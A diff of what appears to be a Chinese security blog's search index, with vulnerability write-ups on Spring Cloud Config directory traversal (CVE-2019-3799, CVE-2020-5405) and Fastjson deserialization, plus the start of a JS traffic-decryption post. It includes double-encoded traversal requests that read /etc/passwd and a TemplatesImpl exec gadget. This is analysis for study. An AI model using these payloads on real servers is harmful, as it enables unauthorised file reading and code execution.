@@ -1,6 +1,66 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CVE-2019-3799 Spring Cloud Config目录遍历漏洞</title>
+    <url>/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/</url>
+    <content><![CDATA[<p>官方描述：<a href="https://spring.io/blog/2019/04/17/cve-2019-3799-spring-cloud-config-2-1-2-2-0-4-1-4-6-released" target="_blank" rel="noopener">https://spring.io/blog/2019/04/17/cve-2019-3799-spring-cloud-config-2-1-2-2-0-4-1-4-6-released</a></p>
+<blockquote>
+<p>We have released Spring Cloud Config 2.1.2, 2.0.4, and 1.4.6 to address <a href="https://pivotal.io/security/cve-2019-3799" target="_blank" rel="noopener">CVE-2019-3799: Directory Traversal with spring-cloud-config-server</a>. Please review the information in the CVE report and upgrade immediately.</p>
+</blockquote>
+<p>在<a href="https://github.com/spring-cloud/spring-cloud-config/releases" target="_blank" rel="noopener">release</a>中找到修复前的版本2.1.1代码 <a href="https://github.com/spring-cloud/spring-cloud-config/releases/tag/v2.1.1.RELEASE" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config/releases/tag/v2.1.1.RELEASE</a> 用于复现</p>
+<a id="more"></a>
+
+<p>本次更新的代码路径为<code>spring-cloud-config-server/src/main/java/org/springframework/cloud/config/server/resource/GenericResourceRepository.java</code>，commit地址为 <a href="https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2</a></p>
+<h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p>补丁主要是在findOne()方法中增加了传入参数path的判断</p>
+<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/diff-2.1.1-findOne.png" alt="diff-2.1.1-findOne.png"></p>
+<p><code>isInvalidPath</code>方法用于判断路径中是否存在<code>WEB-INF</code>、<code>META-INF</code>、<code>:/</code>、<code>../</code>，如果存在则返回true，导致<code>if (!isInvalidPath(local))</code>为假。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isInvalidPath</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">"WEB-INF"</span>) || path.contains(<span class="string">"META-INF"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">            logger.warn(<span class="string">"Path with \"WEB-INF\" or \"META-INF\": ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">":/"</span>)) &#123;</span><br><span class="line">        String relativePath = (path.charAt(<span class="number">0</span>) == <span class="string">'/'</span> ? path.substring(<span class="number">1</span>) : path);</span><br><span class="line">        <span class="keyword">if</span> (ResourceUtils.isUrl(relativePath) || relativePath.startsWith(<span class="string">"url:"</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">                logger.warn(<span class="string">"Path represents URL or has \"url:\" prefix: ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">".."</span>) &amp;&amp; StringUtils.cleanPath(path).contains(<span class="string">"../"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">            logger.warn(<span class="string">"Path contains \"../\" after call to StringUtils#cleanPath: ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>isInvalidEncodedPath</code>方法用于判断路径中是否存在<code>%</code>，若存在则再进行一次URL解码再调用<code>isInvalidPath</code>方法。</p>
+<p>第二个和第三个if中的<code>processPath</code>方法是将<code>\</code>替换成<code>/</code>，再清除连续重复的<code>/</code>。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isInvalidEncodedPath</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">"%"</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Use URLDecoder (vs UriUtils) to preserve potentially decoded UTF-8 chars</span></span><br><span class="line">            String decodedPath = URLDecoder.decode(path, <span class="string">"UTF-8"</span>);</span><br><span class="line">            <span class="keyword">if</span> (isInvalidPath(decodedPath)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            decodedPath = processPath(decodedPath);</span><br><span class="line">            <span class="keyword">if</span> (isInvalidPath(decodedPath)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalArgumentException | UnsupportedEncodingException ex) &#123;</span><br><span class="line">            <span class="comment">// Should never happen...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><blockquote>
+<p>调试所使用版本为<code>spring-cloud-config-2.1.1.RELEASE</code></p>
+</blockquote>
+<p>既然是findOne()方法中增加了路径分析，表明之前未做路径防护可能导致任意文件读取漏洞产生。回溯findOne()方法就能找到漏洞的利用点。查看findOne()方法的调用信息（在方法处右键点击Find Usages），可以看到有12处相关引用，由于限制在path参数，于是主要寻找path参数可控的点。</p>
+<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/find-findOne-usages.png" alt="find-findOne-usages.png"></p>
+<p>找到<code>src/main/java/org/springframework/cloud/config/server/resource/ResourceController.java</code>中调用了<code>findOne()</code>方法，且path可控。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/&#123;name&#125;/&#123;profile&#125;/&#123;label&#125;/**"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">retrieve</span><span class="params">(@PathVariable String name, @PathVariable String profile,</span></span></span><br><span class="line"><span class="function"><span class="params">        @PathVariable String label, ServletWebRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">        @RequestParam(defaultValue = <span class="string">"true"</span>)</span> <span class="keyword">boolean</span> resolvePlaceholders)</span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String path = getFilePath(request, name, profile, label);</span><br><span class="line">    <span class="keyword">return</span> retrieve(request, name, profile, label, path, resolvePlaceholders);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> String <span class="title">retrieve</span><span class="params">(ServletWebRequest request, String name, String profile,</span></span></span><br><span class="line"><span class="function"><span class="params">        String label, String path, <span class="keyword">boolean</span> resolvePlaceholders)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    name = resolveName(name);</span><br><span class="line">    label = resolveLabel(label);</span><br><span class="line">    Resource resource = <span class="keyword">this</span>.resourceRepository.findOne(name, profile, label, path);</span><br><span class="line">    <span class="keyword">if</span> (checkNotModified(request, resource)) &#123;</span><br><span class="line">        <span class="comment">// Content was not modified. Just return.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ensure InputStream will be closed to prevent file locks on Windows</span></span><br><span class="line">    <span class="keyword">try</span> (InputStream is = resource.getInputStream()) &#123;</span><br><span class="line">        String text = StreamUtils.copyToString(is, Charset.forName(<span class="string">"UTF-8"</span>));</span><br><span class="line">        <span class="keyword">if</span> (resolvePlaceholders) &#123;</span><br><span class="line">            Environment environment = <span class="keyword">this</span>.environmentRepository.findOne(name,</span><br><span class="line">                    profile, label);</span><br><span class="line">            text = resolvePlaceholders(prepareEnvironment(environment), text);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>path参数为<code>@RequestMapping(&quot;/{name}/{profile}/{label}/**&quot;)</code>中<code>**</code>的部分，也就是uri第三个标签后的全部内容。注意此处传入的label必须为master，具体原因在CVE-2020-5405中会讲到。</p>
+<p>传入<code>GET /name/profile/master/..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt</code>时，path参数为<code>..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt</code></p>
+<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-retrieve.png" alt="debug-retrieve"></p>
+<p><code>FileUrlResource</code>对象中的<code>relativePath</code>为<code>..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Ftest.txt</code></p>
+<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-FileUrlResource.png" alt="debug-FileUrlResource"></p>
+<p>path解码后的路径，路径回溯正好变成<code>/tmp/test.txt</code></p>
+<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-file.png" alt="debug-file"></p>
+<p>findOne()方法执行完成之后，返回Resource对象。Resource是Spring框架中用于访问低级资源的一个抽象接口，常用来读取配置文件。</p>
+<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-return-file.png" alt="debug-return-file" style="zoom:43%;">
+
+<p>根据findOne()返回的Resource对象，读取到的文件内容。</p>
+<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-get-text.png" alt="debug-get-text" style="zoom:40%;">
+
+
+
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>IDEA导入程序后，先等待maven自动安装依赖。依赖安装完成后，找到spring-cloud-config-server中<code>src/main/java/org/springframework/cloud/config/server/ConfigServerApplication.java</code>，点击<code>ConfigServerApplication</code>类右边的运行，启动程序即可，端口默认为8888，想要修改端口的话可在<code>src/main/resources/configserver.yml</code>中修改。</p>
+<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/run-application.png" alt="run-application.png" style="zoom:40%;">
+
+
+
+<p>程序运行起来之后访问<code>http(s)://ip:port/foo/label/master/..%252f..%252f..%252f..%252fetc%252fpasswd</code>得到以下结果</p>
+<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/poc-request.png" alt="poc-request"></p>
+<p>不二次编码的效果如下，因为不二次编码传到代码前会自动URL解码一次，变成<code>/foo/label/master/../../../../etc/passwd</code>，等效于直接访问<code>/../etc/passwd</code>，tomcat会把它识别成一个错误的URI，请求不会传到ResourceController中，也就不会进行后续<code>findOne()</code>方法的调用。</p>
+<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/not-double-encode.png" alt="not-double-encode"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>CVE-2020-5405 Spring Cloud Config目录遍历漏洞绕过</title>
     <url>/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/</url>
     <content><![CDATA[<p>该漏洞是CVE-2019-3799的绕过。</p>
@@ -80,66 +140,6 @@
 
 <h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>通用的PoC，绝对路径和相对路径都能使用：<a href="http://127.0.0.1:8889/test/test/%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%252ftmp/test.txt" target="_blank" rel="noopener">http://127.0.0.1:8889/test/test/%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%2e%2e%28%5f%29%252ftmp/test.txt</a></p>
 <p><img src="/2020/06/27/CVE-2020-5405_Spring_Cloud_Config_Directory_Traversal_Bypass/poc-request.png" alt="poc-request"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>CVE-2019-3799 Spring Cloud Config目录遍历漏洞</title>
-    <url>/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/</url>
-    <content><![CDATA[<p>官方描述：<a href="https://spring.io/blog/2019/04/17/cve-2019-3799-spring-cloud-config-2-1-2-2-0-4-1-4-6-released" target="_blank" rel="noopener">https://spring.io/blog/2019/04/17/cve-2019-3799-spring-cloud-config-2-1-2-2-0-4-1-4-6-released</a></p>
-<blockquote>
-<p>We have released Spring Cloud Config 2.1.2, 2.0.4, and 1.4.6 to address <a href="https://pivotal.io/security/cve-2019-3799" target="_blank" rel="noopener">CVE-2019-3799: Directory Traversal with spring-cloud-config-server</a>. Please review the information in the CVE report and upgrade immediately.</p>
-</blockquote>
-<p>在<a href="https://github.com/spring-cloud/spring-cloud-config/releases" target="_blank" rel="noopener">release</a>中找到修复前的版本2.1.1代码 <a href="https://github.com/spring-cloud/spring-cloud-config/releases/tag/v2.1.1.RELEASE" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config/releases/tag/v2.1.1.RELEASE</a> 用于复现</p>
-<a id="more"></a>
-
-<p>本次更新的代码路径为<code>spring-cloud-config-server/src/main/java/org/springframework/cloud/config/server/resource/GenericResourceRepository.java</code>，commit地址为 <a href="https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config/commit/3632fc6f64e567286c42c5a2f1b8142bfde505c2</a></p>
-<h1 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h1><p>补丁主要是在findOne()方法中增加了传入参数path的判断</p>
-<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/diff-2.1.1-findOne.png" alt="diff-2.1.1-findOne.png"></p>
-<p><code>isInvalidPath</code>方法用于判断路径中是否存在<code>WEB-INF</code>、<code>META-INF</code>、<code>:/</code>、<code>../</code>，如果存在则返回true，导致<code>if (!isInvalidPath(local))</code>为假。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isInvalidPath</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">"WEB-INF"</span>) || path.contains(<span class="string">"META-INF"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">            logger.warn(<span class="string">"Path with \"WEB-INF\" or \"META-INF\": ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">":/"</span>)) &#123;</span><br><span class="line">        String relativePath = (path.charAt(<span class="number">0</span>) == <span class="string">'/'</span> ? path.substring(<span class="number">1</span>) : path);</span><br><span class="line">        <span class="keyword">if</span> (ResourceUtils.isUrl(relativePath) || relativePath.startsWith(<span class="string">"url:"</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">                logger.warn(<span class="string">"Path represents URL or has \"url:\" prefix: ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">".."</span>) &amp;&amp; StringUtils.cleanPath(path).contains(<span class="string">"../"</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isWarnEnabled()) &#123;</span><br><span class="line">            logger.warn(<span class="string">"Path contains \"../\" after call to StringUtils#cleanPath: ["</span> + path + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><code>isInvalidEncodedPath</code>方法用于判断路径中是否存在<code>%</code>，若存在则再进行一次URL解码再调用<code>isInvalidPath</code>方法。</p>
-<p>第二个和第三个if中的<code>processPath</code>方法是将<code>\</code>替换成<code>/</code>，再清除连续重复的<code>/</code>。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isInvalidEncodedPath</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (path.contains(<span class="string">"%"</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Use URLDecoder (vs UriUtils) to preserve potentially decoded UTF-8 chars</span></span><br><span class="line">            String decodedPath = URLDecoder.decode(path, <span class="string">"UTF-8"</span>);</span><br><span class="line">            <span class="keyword">if</span> (isInvalidPath(decodedPath)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            decodedPath = processPath(decodedPath);</span><br><span class="line">            <span class="keyword">if</span> (isInvalidPath(decodedPath)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalArgumentException | UnsupportedEncodingException ex) &#123;</span><br><span class="line">            <span class="comment">// Should never happen...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h1><blockquote>
-<p>调试所使用版本为<code>spring-cloud-config-2.1.1.RELEASE</code></p>
-</blockquote>
-<p>既然是findOne()方法中增加了路径分析，表明之前未做路径防护可能导致任意文件读取漏洞产生。回溯findOne()方法就能找到漏洞的利用点。查看findOne()方法的调用信息（在方法处右键点击Find Usages），可以看到有12处相关引用，由于限制在path参数，于是主要寻找path参数可控的点。</p>
-<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/find-findOne-usages.png" alt="find-findOne-usages.png"></p>
-<p>找到<code>src/main/java/org/springframework/cloud/config/server/resource/ResourceController.java</code>中调用了<code>findOne()</code>方法，且path可控。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/&#123;name&#125;/&#123;profile&#125;/&#123;label&#125;/**"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">retrieve</span><span class="params">(@PathVariable String name, @PathVariable String profile,</span></span></span><br><span class="line"><span class="function"><span class="params">        @PathVariable String label, ServletWebRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">        @RequestParam(defaultValue = <span class="string">"true"</span>)</span> <span class="keyword">boolean</span> resolvePlaceholders)</span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String path = getFilePath(request, name, profile, label);</span><br><span class="line">    <span class="keyword">return</span> retrieve(request, name, profile, label, path, resolvePlaceholders);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> String <span class="title">retrieve</span><span class="params">(ServletWebRequest request, String name, String profile,</span></span></span><br><span class="line"><span class="function"><span class="params">        String label, String path, <span class="keyword">boolean</span> resolvePlaceholders)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    name = resolveName(name);</span><br><span class="line">    label = resolveLabel(label);</span><br><span class="line">    Resource resource = <span class="keyword">this</span>.resourceRepository.findOne(name, profile, label, path);</span><br><span class="line">    <span class="keyword">if</span> (checkNotModified(request, resource)) &#123;</span><br><span class="line">        <span class="comment">// Content was not modified. Just return.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ensure InputStream will be closed to prevent file locks on Windows</span></span><br><span class="line">    <span class="keyword">try</span> (InputStream is = resource.getInputStream()) &#123;</span><br><span class="line">        String text = StreamUtils.copyToString(is, Charset.forName(<span class="string">"UTF-8"</span>));</span><br><span class="line">        <span class="keyword">if</span> (resolvePlaceholders) &#123;</span><br><span class="line">            Environment environment = <span class="keyword">this</span>.environmentRepository.findOne(name,</span><br><span class="line">                    profile, label);</span><br><span class="line">            text = resolvePlaceholders(prepareEnvironment(environment), text);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>path参数为<code>@RequestMapping(&quot;/{name}/{profile}/{label}/**&quot;)</code>中<code>**</code>的部分，也就是uri第三个标签后的全部内容。注意此处传入的label必须为master，具体原因在CVE-2020-5405中会讲到。</p>
-<p>传入<code>GET /name/profile/master/..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt</code>时，path参数为<code>..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Ftest.txt</code></p>
-<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-retrieve.png" alt="debug-retrieve"></p>
-<p><code>FileUrlResource</code>对象中的<code>relativePath</code>为<code>..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Ftest.txt</code></p>
-<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-FileUrlResource.png" alt="debug-FileUrlResource"></p>
-<p>path解码后的路径，路径回溯正好变成<code>/tmp/test.txt</code></p>
-<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-file.png" alt="debug-file"></p>
-<p>findOne()方法执行完成之后，返回Resource对象。Resource是Spring框架中用于访问低级资源的一个抽象接口，常用来读取配置文件。</p>
-<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-return-file.png" alt="debug-return-file" style="zoom:43%;">
-
-<p>根据findOne()返回的Resource对象，读取到的文件内容。</p>
-<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/debug-get-text.png" alt="debug-get-text" style="zoom:40%;">
-
-
-
-<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>IDEA导入程序后，先等待maven自动安装依赖。依赖安装完成后，找到spring-cloud-config-server中<code>src/main/java/org/springframework/cloud/config/server/ConfigServerApplication.java</code>，点击<code>ConfigServerApplication</code>类右边的运行，启动程序即可，端口默认为8888，想要修改端口的话可在<code>src/main/resources/configserver.yml</code>中修改。</p>
-<img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/run-application.png" alt="run-application.png" style="zoom:40%;">
-
-
-
-<p>程序运行起来之后访问<code>http(s)://ip:port/foo/label/master/..%252f..%252f..%252f..%252fetc%252fpasswd</code>得到以下结果</p>
-<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/poc-request.png" alt="poc-request"></p>
-<p>不二次编码的效果如下，因为不二次编码传到代码前会自动URL解码一次，变成<code>/foo/label/master/../../../../etc/passwd</code>，等效于直接访问<code>/../etc/passwd</code>，tomcat会把它识别成一个错误的URI，请求不会传到ResourceController中，也就不会进行后续<code>findOne()</code>方法的调用。</p>
-<p><img src="/2020/06/25/CVE-2019-3799_Spring_Cloud_Config_Directory_Traversal/not-double-encode.png" alt="not-double-encode"></p>
 ]]></content>
   </entry>
   <entry>
@@ -349,7 +349,7 @@
 <p><img src="/2020/02/27/Fastjson-deserialization/InitialContext-lookup.png" alt="InitialContext-lookup"></p>
 <p>整个调用栈过程如下</p>
 <p><img src="/2020/02/27/Fastjson-deserialization/jdbcrowsetimpl-stack.png" alt="jdbcrowsetimpl-stack"></p>
-<p>整个过程调用的都是setter方法，所以该调用链在<code>parse</code>和<code>parseObject()</code>中都能使用。</p>
+<p>整个过程调用的都是setter方法，所以该调用链在<code>parse()</code>和<code>parseObject()</code>中都能使用。</p>
 <h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，该调用链存在一定的限制，因为在默认情况下只会去反序列化public修饰的属性，在PoC中，<code>_bytecodes</code>和<code>_name</code>都是私有属性，所以想要反序列化这两个属性，需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>。在实际场景中很少会设置<code>Feature.SupportNonPublicField</code>，所以该调用链在实际场景的利用有限。</p>
 <p>首先，在构造函数<code>TemplatesImplDemo</code>中的<code>Runtime.getRuntime().exec()</code>中输入想要执行的命令，然后将代码编译成class文件</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImplDemo</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TemplatesImplDemo</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open /System/Applications/Calculator.app"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImplDemo t = <span class="keyword">new</span> TemplatesImplDemo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -408,6 +408,235 @@
 <p><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p>
 <p><a href="http://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.mi1k7ea.com/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>通过JS解开加密传输</title>
+    <url>/2020/04/03/JS-Decrypt/</url>
+    <content><![CDATA[<h1 id="JS解密过程"><a href="#JS解密过程" class="headerlink" title="JS解密过程"></a>JS解密过程</h1><blockquote>
+<p>为了不泄漏信息，文章中存在打码，修改参数等脱敏措施，但解密的方法未变，可供参考。</p>
+</blockquote>
+<p>很多app传输会对报文进行加密，并存在防篡改的签名机制，导致不能修改参数进行渗透测试，对于我不熟悉app逆向的人来说逆向app的成本比较高，这里介绍一种比较便捷的解密方式，就是通过js来解密请求。前提是需要这个app存在h5页面，并且h5页面的加密算法和app本身的加密算法一致。</p>
